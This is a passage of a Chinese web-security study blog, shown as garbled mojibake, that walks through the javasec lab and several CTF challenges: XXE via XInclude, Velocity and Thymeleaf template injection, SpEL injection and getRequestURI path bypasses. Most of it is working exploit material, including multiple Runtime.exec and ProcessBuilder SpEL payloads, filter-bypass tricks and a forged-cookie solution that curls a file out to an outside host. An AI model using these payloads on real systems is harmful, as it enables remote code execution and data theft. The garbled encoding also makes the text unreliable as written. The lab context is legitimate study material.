·æœ‰è¿™ä¹ˆä½çº§çš„é”™è¯¯ã€‚æ­£å¸¸æ¥è¯´æˆ‘ä»¬ä¸€èˆ¬æ˜¯å¯ä»¥å°è¯•xxeè¯»æ–‡ä»¶ 1234&lt;?xml version=\"1.0\" ?&gt;&lt;root xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt; &lt;xi:include href=\"file:///etc/passwd\" parse=\"text\"/&gt;&lt;/root&gt; å¯¹äºphpè€Œè¨€ã€‚ä¸éœ€è¦æ‰“å¼€å¤–éƒ¨å®ä½“å¼•ç”¨é€‰é¡¹ï¼Œä¹Ÿèƒ½ä½¿ç”¨xincludeè¯»å–æœ¬åœ°æ–‡ä»¶ã€‚ è¿™é‡Œé¡ºä¾¿åˆ†äº«ä¸‹htb é‚£é‡Œå‚è€ƒçš„æ–‡ç« ã€‚æˆ‘è®¤ä¸ºå…¶åˆ©ç”¨å¯¹äºæå‡xxeä½œç”¨è¿™ç‚¹æ˜¯å¾ˆæœ‰å‚è€ƒä»·å€¼çš„ã€‚https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/ æ€»è€Œè¨€ä¹‹,javaè¿›è¡Œxxeç›¸æ¯”å¸¸è§çš„phpåç«¯è€Œè¨€å¤šäº†è®¸å¤šé™åˆ¶ã€‚ä½†æ˜¯å¯ä»¥åˆ—ç›®å½•è¿™ç‚¹æ˜¯å…³é”®ã€‚åŒæ—¶é‡åˆ°è¦ç›²æ‰“æ—¶ï¼Œftpæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚é˜²å¾¡ä¸Š,ä½¿ç”¨setFeatureå°±èƒ½è®©å¤–éƒ¨å®ä½“ä¸è¢«åŠ è½½ã€‚ sstiJavaçš„sstiç›¸æ¯”è¾ƒjinjaç­‰ç­‰è€Œè¨€è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ã€‚åªæ˜¯å¯¹äºä¸åŒæ¡†æ¶åº”å¯¹æ‰‹æ®µä¸åŒ 123456789101112131415161718192021222324252627282930313233343536373839package org.joychou.controller;import org.apache.velocity.VelocityContext;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import org.apache.velocity.app.Velocity;import java.io.StringWriter;@RestController@RequestMapping(\"/ssti\")public class SSTI &#123; /** * SSTI of Java velocity. The latest Velocity version still has this problem. * Fix method: Avoid to use Velocity.evaluate method. * &lt;p&gt; * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22) * Open a calculator in MacOS. * * @param template exp */ @GetMapping(\"/velocity\") public void velocity(String template) &#123; Velocity.init(); VelocityContext context = new VelocityContext(); context.put(\"author\", \"Elliot A.\"); context.put(\"address\", \"217 E Broadway\"); context.put(\"phone\", \"555-1337\"); StringWriter swOut = new StringWriter(); Velocity.evaluate(context, swOut, \"test\", template); &#125;&#125; æ­¤å¤„æ˜¯ä¸€ä¸ªVelocityçš„sstiã€‚payloadæ˜¯#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;curl xxxx&quot;) å¯ä»¥çœ‹å‡ºæ¸²æŸ“çš„è¯­å¥æ˜¯#å¼€å¤´åæ¥ä¸€ä¸ªåå°„æ„é€ çš„å‘½ä»¤æ‰§è¡Œpayload.$eä¸ºå­—ç¬¦ä¸²ã€‚å› æ­¤åé¢å°±æ˜¯ä»java.lang.Stringå¯¹è±¡å¼€å§‹è·å–ç±»ï¼Œæ–¹æ³•ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚ è¿™ç‚¹ä¸Šä»æŸç§è§’åº¦ä¸SpELéå¸¸ç›¸ä¼¼ã€‚å½“ç„¶åé¢åšSpELæ³¨å…¥æ—¶å†ç»†è®²ã€‚è¿™é‡Œåˆ†äº«ä¸€ä¸ªä¹‹å‰åœ¨SharkyCTFä¸­é‡åˆ°çš„Thymeleaf sstiã€‚å› ä¸ºå½“æ—¶é¢˜ç›®åç«¯æŠŠå„ç§å‘½ä»¤æ‰§è¡Œéƒ½hookäº†,è‡ªå·±ä¸€ç›´æ²¡èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤,è™½ç„¶å®é™…ä¸Šä¸éœ€è¦å‘½ä»¤æ‰§è¡Œå°±èƒ½åš,ä½†æ˜¯æŸ¥èµ„æ–™çš„è¿‡ç¨‹ä¸­ä¹Ÿæœ‰äº†æ–°çš„æ”¶è·ã€‚ https://ctftime.org/task/11563 è¿™é¢˜å› ä¸ºä½¿ç”¨äº†Thymeleaf.åŠ ä¸Šæˆ‘åœ¨ä½¿ç”¨[[${7*7}]]æ—¶è¿”å›äº†49ã€‚æ‰€ä»¥æˆ‘è®¤ä¸ºæ˜¯ä½¿ç”¨äº†Thymeleafæ¥è¿›è¡Œæ¸²æŸ“çš„ã€‚(Thymeleafæ˜¯é€šè¿‡ä¸¤ä¸ªä¸­æ‹¬å·å–å€¼çš„)å¯æƒœé¢˜ç›®åº•å±‚hookçš„éå¸¸ä¸¥,æ²¡èƒ½RCEã€‚è¯»æ–‡ä»¶çš„payload[[${ new java.io.BufferReader(new java.io.FileReader(&quot;/etc/passwd&quot;)).readLine()}]]éƒ½åšä¸åˆ°ã€‚æ¯”èµ›ç»“æŸåæ‰å‘ç°è¦çŒœflagè¿™ä¸ªclassçš„å­˜åœ¨çš„,æ¯”è¾ƒæ— è¯­ã€‚ä½†æ˜¯ä»ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º,java sstiå…¶å®å°±æ˜¯åˆ¤æ–­å‡ºå¯¹åº”å¼•æ“åç”¨æ¥è¿‘äºSpELçš„æ€è·¯æ¥è¿›è¡Œåˆ©ç”¨ã€‚å¦åˆ™å°±æ˜¯åˆ©ç”¨é¢˜ç›®ç¯å¢ƒä¸­çš„classè¯»å–å˜é‡. æ¯”èµ›ä¸­å½“æ—¶å‚è€ƒäº†è¿™ç¯‡æ–‡ç« https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/å…¶å®ä»”ç»†æƒ³æƒ³æ€ä¹ˆçœ‹éƒ½æ˜¯SpELçš„æ„æ€â€¦â€¦æ‰€ä»¥ç›¸å…³æŠ€å·§è¿˜æ˜¯ç•™åˆ°ä¸‹ä¸€ç¯‡SpELè®²å§ã€‚ SpELvuln code 12345678910111213141516171819202122232425262728293031323334353637package org.joychou.controller;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;/** * SpEL Injection * * @author JoyChou @2019-01-17 */@RestControllerpublic class SpEL &#123; /** * SPEL to RCE * http://localhost:8080/spel/vul/?expression=xxx. * xxx is urlencode(exp) * exp: T(java.lang.Runtime).getRuntime().exec(\"curl xxx.ceye.io\") */ @GetMapping(\"/spel/vuln\") public String rce(String expression) &#123; ExpressionParser parser = new SpelExpressionParser(); // fix method: SimpleEvaluationContext return parser.parseExpression(expression).getValue().toString(); &#125; public static void main(String[] args) &#123; ExpressionParser parser = new SpelExpressionParser(); String expression = \"T(java.lang.Runtime).getRuntime().exec(\\\"open -a Calculator\\\")\"; String result = parser.parseExpression(expression).getValue().toString(); System.out.println(result); &#125;&#125; é¦–å…ˆ,SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ æ˜¯EL(expression language)çš„ä¸€ç§ã€‚ä¹‹æ‰€ä»¥å«SpELæ˜¯å› ä¸ºå®ƒæ˜¯åº”ç”¨åœ¨Springæ¡†æ¶ä¸­çš„ã€‚ä¸è¿‡åªè¦æŒæ¡äº†SpELçš„ç›¸å…³çŸ¥è¯†ï¼Œæƒ³å¿…å…¶ä»–çš„è¡¨è¾¾å¼æ³¨å…¥æ¼æ´ä¹Ÿèƒ½æ”¶æ‰‹åˆ°æ“’æ¥å§ã€‚ SpELæœ‰è®¸å¤šç‰¹æ€§ï¼š ä½¿ç”¨Beançš„IDæ¥å¼•ç”¨Bean å¯è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å¯¹è±¡çš„å±æ€§ å¯å¯¹å€¼è¿›è¡Œç®—æ•°ã€å…³ç³»å’Œé€»è¾‘è¿ç®— å¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é… å¯è¿›è¡Œé›†åˆæ“ä½œ å› æ­¤æˆ‘è®¤ä¸ºä¸Šé¢ä¸€ç±»javaçš„sstiåˆ©ç”¨æœ¬è´¨ä¸Šè¿˜æ˜¯åœ¨å®šç•Œç¬¦ä¸­è¿›è¡Œäº†è¡¨è¾¾å¼è¿ç®—,æ‰€ä»¥äº†è§£è¡¨è¾¾å¼æ³¨å…¥ä¹Ÿå°±æˆä¸ºäº†é‡ä¸­ä¹‹é‡ã€‚ é¦–å…ˆæ˜¯è¯­æ³•çŸ¥è¯† SpELæ”¯æŒçš„å®šç•Œç¬¦ #{} å¼•ç”¨å…¶ä»–å¯¹è±¡:#{car}å¼•ç”¨å…¶ä»–å¯¹è±¡çš„å±æ€§ï¼š#{car.brand}è°ƒç”¨å…¶å®ƒæ–¹æ³• , è¿˜å¯ä»¥é“¾å¼æ“ä½œï¼š#{car.toString()} å±æ€§åç§°è¿˜å¯ä»¥ä½¿ç”¨${xxxx}æ­¤å¤–è¿˜æœ‰ä¸€ç§ä½¿ç”¨Tè¿ç®—ç¬¦,è°ƒç”¨ç±»ä½œç”¨åŸŸæ–¹æ³•å’Œå¸¸é‡#{T(java.lang.Math)}è¿”å›ä¸€ä¸ªjava.lang.Mathå¯¹è±¡ ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬ä¼šæŠŠSpELç”¨åœ¨xmlé…ç½®æˆ–è€…æ³¨è§£çš„ä½¿ç”¨ä¸­ï¼Œè¿™åº”è¯¥æ˜¯æ˜¯ä¸ºäº†å…¶åŠ¨æ€æ€§ã€‚é™¤æ­¤ä¹‹å¤–å°±æ˜¯ç›´æ¥ç”¨åœ¨ä»£ç å—ä¸­è¿›è¡Œexpression. å¯¼è‡´SpELæ³¨å…¥çš„åŸå› å¦‚ä¸‹: SimpleEvaluationContextå’ŒStandardEvaluationContextæ˜¯SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextï¼šSimpleEvaluationContext - é’ˆå¯¹ä¸éœ€è¦SpELè¯­è¨€è¯­æ³•çš„å…¨éƒ¨èŒƒå›´å¹¶ä¸”åº”è¯¥å—åˆ°æœ‰æ„é™åˆ¶çš„è¡¨è¾¾å¼ç±»åˆ«ï¼Œå…¬å¼€SpELè¯­è¨€ç‰¹æ€§å’Œé…ç½®é€‰é¡¹çš„å­é›†ã€‚StandardEvaluationContext - å…¬å¼€å…¨å¥—SpELè¯­è¨€åŠŸèƒ½å’Œé…ç½®é€‰é¡¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŒ‡å®šé»˜è®¤çš„æ ¹å¯¹è±¡å¹¶é…ç½®æ¯ä¸ªå¯ç”¨çš„è¯„ä¼°ç›¸å…³ç­–ç•¥ã€‚ åœ¨ä¸æŒ‡å®šEvaluationContextçš„æƒ…å†µä¸‹é»˜è®¤é‡‡ç”¨çš„æ˜¯StandardEvaluationContextï¼Œè€Œå®ƒåŒ…å«äº†SpELçš„æ‰€æœ‰åŠŸèƒ½ï¼Œåœ¨å…è®¸ç”¨æˆ·æ§åˆ¶è¾“å…¥çš„æƒ…å†µä¸‹å¯ä»¥æˆåŠŸé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ æ­¤å¤„javasecçš„SpELå‘½ä»¤æ‰§è¡Œç†è®ºä¸Šåªè¦ä½¿ç”¨ 1T(java.lang.Runtime).getRuntime().exec(\"curl xxx\") å³å¯ã€‚ä¸è¿‡è¿™é‡Œæ‰§è¡Œæ—¶æ€»æ˜¯ä¸æˆåŠŸï¼Œæœ‰ç‚¹è¿·ã€‚ä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œæ¯•ç«Ÿæ— è®ºæ¯”èµ›è¿˜æ˜¯å®æˆ˜éƒ½ä¸å¯èƒ½ç¢°ä¸Šæ²¡æœ‰wafçš„SpELã€‚è¿™é‡Œå¹²è„†ç›´æ¥æ‰¾å…¶ä»–çš„å‡ ä¸ªä¾‹å­æ¥è¯•è¯•(å…¶å®æ‡’å¾—æœ¬åœ°å»ºä¸ªmavené¡¹ç›®äº†ï¼Œæˆ‘è‡ªå·±çˆ¬) code-breaking javacon å¹´åˆçš„é¢˜ä¸€ç›´ç•™åˆ°ç°åœ¨â€¦å°±æ˜¯ä¸ºäº†å­¦SpELçš„è¿™ä¸€å¤©ã€‚ é¢˜ç›®çš„æºç jarä¸‹å¥½åã€‚è€æ ·å­æ‰”è¿›libé‡Œç›´æ¥å®¡è®¡ç»“æ„:åœ¨é…ç½®application.xmlä¸­æœ‰è¿™æ ·çš„é»‘åå• 1234567891011121314spring: thymeleaf: encoding: UTF-8 cache: false mode: HTMLkeywords: blacklist: - java.+lang - Runtime - exec.*\\(user: username: admin password: admin rememberMeKey: c0dehack1nghere1 æ˜¾ç„¶æ˜¯é™åˆ¶äº†Runtime.execçš„å‘½ä»¤æ‰§è¡Œã€‚ä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªwafçœŸçš„éå¸¸å‹å¥½äº†â€¦ å†æ¥çœ‹ä¸»ä½“æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package io.tricking.challenge;import io.tricking.challenge.spel.SmallEvaluationContext;import java.util.regex.Matcher;import java.util.regex.Pattern;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.ParserContext;import org.springframework.expression.common.TemplateParserContext;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.http.HttpStatus;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.CookieValue;import org.springframework.web.bind.annotation.ExceptionHandler;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseStatus;import org.springframework.web.client.HttpClientErrorException;@Controllerpublic class MainController &#123; ExpressionParser parser = new SpelExpressionParser(); @Autowired private KeyworkProperties keyworkProperties; @Autowired private UserConfig userConfig; public MainController() &#123; &#125; @GetMapping public String admin(@CookieValue(value = \"remember-me\",required = false) String rememberMeValue, HttpSession session, Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(\"\")) &#123; String username = this.userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute(\"username\", username); &#125; &#125; Object username = session.getAttribute(\"username\"); if (username != null &amp;&amp; !username.toString().equals(\"\")) &#123; model.addAttribute(\"name\", this.getAdvanceValue(username.toString())); return \"hello\"; &#125; else &#123; return \"redirect:/login\"; &#125; &#125; @GetMapping(&#123;\"/login\"&#125;) public String login() &#123; return \"login\"; &#125; @GetMapping(&#123;\"/login-error\"&#125;) public String loginError(Model model) &#123; model.addAttribute(\"loginError\", true); model.addAttribute(\"errorMsg\", \"ç™»é™†å¤±è´¥ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ï¼\"); return \"login\"; &#125; @PostMapping(&#123;\"/login\"&#125;) public String login(@RequestParam(value = \"username\",required = true) String username, @RequestParam(value = \"password\",required = true) String password, @RequestParam(value = \"remember-me\",required = false) String isRemember, HttpSession session, HttpServletResponse response) &#123; if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) &#123; session.setAttribute(\"username\", username); if (isRemember != null &amp;&amp; !isRemember.equals(\"\")) &#123; Cookie c = new Cookie(\"remember-me\", this.userConfig.encryptRememberMe()); c.setMaxAge(2592000); response.addCookie(c); &#125; return \"redirect:/\"; &#125; else &#123; return \"redirect:/login-error\"; &#125; &#125; @ExceptionHandler(&#123;HttpClientErrorException.class&#125;) @ResponseStatus(HttpStatus.FORBIDDEN) public String handleForbiddenException() &#123; return \"forbidden\"; &#125; private String getAdvanceValue(String val) &#123; String[] var2 = this.keyworkProperties.getBlacklist(); int var3 = var2.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; String keyword = var2[var4]; Matcher matcher = Pattern.compile(keyword, 34).matcher(val); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = this.parser.parseExpression(val, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString(); &#125;&#125; æµç¨‹éå¸¸ç®€å•ã€‚getAdvanceValueæ˜¯ä¸€ä¸ªè§£å¯†+æ£€æŸ¥é»‘åå•+è°ƒç”¨spelçš„æ–¹æ³•ã€‚è€Œæˆ‘ä»¬åœ¨ç™»å½•åç¨‹åºä¼šä»remembermeçš„cookieå¤„å¯¹è¡¨è¾¾å¼è¿›è¡Œè®¡ç®—ã€‚ æ³¨æ„åˆ°åŠ å¯†æ–¹å¼æºç  1234public String encryptRememberMe() &#123; String encryptd = Encryptor.encrypt(this.rememberMeKey, \"0123456789abcdef\", this.username); return encryptd; &#125; rememberMeKeyæˆ‘ä»¬æ˜¯çŸ¥é“çš„,æ‰€ä»¥å°±å¯ä»¥ç”Ÿæˆå¯¹åº”çš„cookiepayloadäº†ã€‚ 1#&#123;T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),new String[]&#123;\\\"/bin/bash\\\",\\\"-c\\\",\\\"curl xxxx\\\"&#125;)&#125; è¿™é‡Œä½¿ç”¨çš„æ–¹æ³•æ˜¯é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥æ¥ç»•è¿‡å…³é”®å­—è¿‡æ»¤çš„é—®é¢˜ã€‚å¹¶ä¸”æœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨çš„åå°„ä½œä¸ºåŸºç¡€payload.ç”Ÿæˆcookieçš„ä»£ç  123456public class spel &#123; public static void main(String[] args) &#123; System.out.println(Encryptor.encrypt(\"c0dehack1nghere1\", \"0123456789abcdef\", \"#&#123;T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),new String[]&#123;\\\"/bin/bash\\\",\\\"-c\\\",\\\"curl xxxxx/`cat /fla*`\\\"&#125;)&#125;\")); &#125;&#125; æ”¶ä¸‹flag. ç”±äºè¿˜æœ‰å¾ˆå¤šCVEä¹Ÿæ˜¯SpELç›¸å…³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç›¸ä¼¼çš„æ€è·¯æ„é€ payload.æ¯”å¦‚ç”¨javascriptå¼•æ“è·ŸProcessBuilder 12345//åå°„ ScriptEngineManagerç±»ã€‚è·å–eval.#&#123;T(String).getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.la\"+\"ng.Run\"+\"time.getRun\"+\"time().ex\"+\"ec('calc.exe')\")&#125;//åå°„ ProcessBuilder,è¿›è¡Œå‘½ä»¤æ‰§è¡Œ#&#123;(T(String).getClass().forName(\"java.la\"+\"ng.ProcessBuilder\").getConstructor('foo'.split('').getClass()).newInstance(new String[]&#123;'calc.exe'&#125;)).start()&#125; ç„¶åå°±æ˜¯ä¹‹å‰è§è¿‡çš„ç”¨åˆ°æ•°ç»„ç»•è¿‡çš„æ–¹æ³•æ„é€ çš„Nuxeo rceçš„payloadã€‚ç”¨äºbyoass getclass 1#&#123;''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc.exe')&#125; ä¸è¿‡è¿™ä¸ªpayloadå¥½åƒæµ‹è¯•æ—¶å°±æ²¡æˆåŠŸè¿‡ã€‚ ç„¶åè¿˜æœ‰ä¸€ç§bypasså¼•å·çš„æ–¹æ³• 1$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125; å³åˆ©ç”¨Tè¿ç®—ç¬¦è·å–åˆ°Charactorå†ç”¨toStringæ¥å¾—åˆ°å­—ç¬¦ã€‚ De1CTF calc ä¸Šé¢çš„éƒ½æ˜¯å‘½ä»¤æ‰§è¡Œpayloadã€‚ç„¶è€Œå®é™…ä¸Šå¦‚æœé‡åˆ°De1è¿™é“é¢˜ï¼ŒopenraspæŠŠåº•å±‚çš„å‘½ä»¤æ‰§è¡Œéƒ½hookçš„æƒ…å†µ,å°±åªèƒ½ä»åˆ«çš„æ€è·¯ä¸‹æ‰‹äº†ã€‚(è™½ç„¶dalaoè¿˜æ˜¯RCEäº†,å¤ªå¼ºäº†)é¢˜ç›®çš„è¿‡æ»¤å¤§è‡´å¦‚ä¸‹ 1234567ProcessBuilderjava.langgetClassRuntimenewT(# å…ˆæ˜¯è¿™å±‚è¿‡æ»¤,ç„¶åæ‰æ˜¯openraspçš„ä¿æŠ¤ã€‚ è¿™é“é¢˜é¦–å…ˆå¦‚æœåˆ©ç”¨spelä¸åŒºåˆ†å…³é”®å­—å¤§å°å†™çš„ç‰¹æ€§,å¯ä»¥ç›´æ¥å¿½è§†newè¢«è¿‡æ»¤çš„æƒ…å†µè¯»æ–‡ä»¶ 1New java.io.BufferedReader(New java.io.FileReader(\"/flag\")).readLine() ä¸è¿‡å¸ˆå‚…å¯¹äºè¿™äº›å…³é”®å­—çš„ç»•è¿‡ä¹Ÿæœ‰å…¶ä»–çš„åŠæ³•https://landgrey.me/blog/15/ æ¯”å¦‚å‰é¢çš„getClass(),é™¤äº†ç”¨æ•°ç»„ç»•è¿‡,è¿˜å¯ä»¥ç”¨&#39;&#39;.class.getSuperclass().classè·å–åˆ° é™¤æ­¤ä»¥å¤–ï¼Œè¿˜FUZZå‡ºäº†T%00(å¯ä»¥ç»•è¿‡T(çš„wafçš„æ‰‹æ®µã€‚(è¿™æ˜¯åº•å±‚æºç çš„é—®é¢˜,è†œ) è‡³äºdalaoè¾¾æˆRCEçš„æ€è·¯,æˆ‘è§‰å¾—ä¹Ÿéå¸¸å€¼å¾—å­¦ä¹ ã€‚å› ä¸ºæˆ‘ä»¬æƒ³è¦è¯»æ–‡ä»¶æˆ–è€…æ‰§è¡Œå‘½ä»¤çš„è¯,å¿…ç„¶æ˜¯è¦åˆ›å»ºä¸€ä¸ªå®ä¾‹çš„ã€‚è€ŒSpELæä¾›äº†T()ç”¨æ¥æŒ‡å®šä¸€ä¸ªå®ä¾‹,è¿™æ˜¯ä¸€ç§æ€è·¯ã€‚é™¤æ­¤ä»¥å¤–å°±æ˜¯ä½¿ç”¨javaä»£ç æ¥å®ä¾‹åŒ–ã€‚é™¤äº†newä»¥å¤–,åƒååºåˆ—åŒ–è¿™ç§æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥åˆ›å»ºå®ä¾‹çš„ã€‚æ‰€ä»¥ä½¿ç”¨T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(&#39;rO0AB...&#39;))è¿™ç§é™æ€æ–¹æ³•å®Œå…¨å¯ä»¥ã€‚é™¤æ­¤ä¹‹å¤–å°±æ˜¯è¦æŠŠæ¶æ„ä»£ç å†™åœ¨é»˜è®¤çš„ç±»æ„é€ å™¨ä¸­ï¼Œå°±ä¸éœ€è¦æ˜¾ç¤ºçš„å®ä¾‹åŒ–ç±»ï¼Œä¹Ÿèƒ½æ‰§è¡Œä»£ç äº†ã€‚ å¦‚æœä»¥åé‡åˆ°å¯¹åº”çš„é—®é¢˜ä¸€å®šä¼šå»ä»”ç»†ç ”ç©¶ä¸‹ã€‚ url security issuesä»Šå¤©æ¥å°±å‡ ä¸ªurlçš„é—®é¢˜ç¨å¾®ç ”ç©¶ä¸‹ã€‚ GetRequestURI GetRequestURI.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package org.joychou.controller;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.util.AntPathMatcher;import org.springframework.util.PathMatcher;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import javax.servlet.http.HttpServletRequest;/** * The difference between getRequestURI and getServletPath. * ç”±äºSpring Securityçš„&lt;code&gt;antMatchers(\"/css/**\", \"/js/**\")&lt;/code&gt;æœªä½¿ç”¨getRequestURIï¼Œæ‰€ä»¥ç™»å½•ä¸ä¼šè¢«ç»•è¿‡ã€‚ * &lt;p&gt; * Details: https://joychou.org/web/security-of-getRequestURI.html * &lt;p&gt; * Poc: * http://localhost:8080/css/%2e%2e/exclued/vuln * http://localhost:8080/css/..;/exclued/vuln * http://localhost:8080/css/..;bypasswaf/exclued/vuln * * @author JoyChou @2020-03-28 */@RestController@RequestMapping(\"uri\")public class GetRequestURI &#123; private final Logger logger = LoggerFactory.getLogger(this.getClass()); @GetMapping(value = \"/exclued/vuln\") public String exclued(HttpServletRequest request) &#123; String[] excluedPath = &#123;\"/css/**\", \"/js/**\"&#125;; String uri = request.getRequestURI(); // Security: request.getServletPath() PathMatcher matcher = new AntPathMatcher(); logger.info(\"getRequestURI: \" + uri); logger.info(\"getServletPath: \" + request.getServletPath()); for (String path : excluedPath) &#123; if (matcher.match(path, uri)) &#123; return \"You have bypassed the login page.\"; &#125; &#125; return \"This is a login page &gt;..&lt;\"; &#125;&#125; geteRequestURIå®é™…ä¸Šæ˜¯HttpServletRequestä¸­å‡ ä¸ªè§£æURLçš„å‡½æ•°ä¸­çš„ä¸€ç§ã€‚å®ƒä¼šè¿”å›é™¤å»Hostï¼ˆåŸŸåæˆ–IPï¼‰éƒ¨åˆ†çš„è·¯å¾„ã€‚è¿™é‡Œæˆ‘ä»¬æœ¬åœ°æ¥èµ·ä¸ªé¡¹ç›®è·‘ä¸€ä¸‹ã€‚æŒ‰ç…§Mi1k7eaåšå®¢ä¸­çš„jspæ›¿æ¢index.jsp (https://xz.aliyun.com/t/7544) 1234567&lt;% out.println(\"getRequestURL(): \" + request.getRequestURL() + \"&lt;br&gt;\"); out.println(\"getRequestURI(): \" + request.getRequestURI() + \"&lt;br&gt;\"); out.println(\"getContextPath(): \" + request.getContextPath() + \"&lt;br&gt;\"); out.println(\"getServletPath(): \" + request.getServletPath() + \"&lt;br&gt;\"); out.println(\"getPathInfo(): \" + request.getPathInfo() + \"&lt;br&gt;\");%&gt; èµ·ä¸€ä¸ªtomcatçš„è¯,è¦åœ¨Run=&gt;EditConfiguration å·¦è¾¹+å·æ·»åŠ ä¸€ä¸ªlocal tomcat serverã€‚å¹¶å°†é¡¹ç›®è·¯å¾„é…ç½®å¥½ã€‚æˆ‘è¿™é‡Œé…ç½®çš„æ ¹ç›®å½•æ˜¯java_sec_web. æ¥ç€æ¥å®éªŒã€‚ä¸€ä¸‹å‡ ç§å½¢å¼çš„è®¿é—®éƒ½å¯ä»¥è®¿é—®åˆ°index.jsp 123http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;index.jsphttp:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;index.jsphttp:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_web&#x2F;totally_not_matter&#x2F;..&#x2F;index.jsp ç‰¹åˆ«çš„,ä½¿ç”¨;a/;bb/;ccc/index.jspä¹Ÿå¯ä»¥è®¿é—®åˆ°ã€‚ ä»è¿™é‡Œæˆ‘ä»¬å°±èƒ½å‘ç°ã€‚ä½¿ç”¨getRequestURIä¼¼ä¹å°±æ˜¯ç›´æ¥è¿”å›æˆ‘ä»¬è¯·æ±‚è·¯å¾„hoståé¢çš„éƒ¨åˆ†ã€‚å®é™…ä¸Šåº•å±‚æºç 